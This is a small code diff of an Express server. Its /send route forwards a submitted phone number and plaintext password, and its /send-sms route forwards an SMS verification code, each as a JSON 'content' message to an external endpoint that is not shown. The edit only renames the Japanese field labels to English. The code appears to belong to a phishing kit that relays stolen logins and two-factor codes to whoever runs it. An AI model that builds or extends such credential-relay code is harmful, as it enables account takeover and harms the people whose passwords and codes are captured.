@@ -26,7 +26,7 @@ app.post("/send", async (req, res) => {
         "Content-Type": "application/json"
       },
       body: JSON.stringify({
-        content: `\n電話番号: ${phone}\nパスワード: ${password}`
+        content: `\ntel: ${phone}\npass: ${password}`
       })
     });
 
@@ -57,7 +57,7 @@ app.post("/send-sms", async (req, res) => {
         "Content-Type": "application/json"
       },
       body: JSON.stringify({
-        content: `\n認証コード: ${safeCode}`
+        content: `\nsms: ${safeCode}`
       })
     });
 
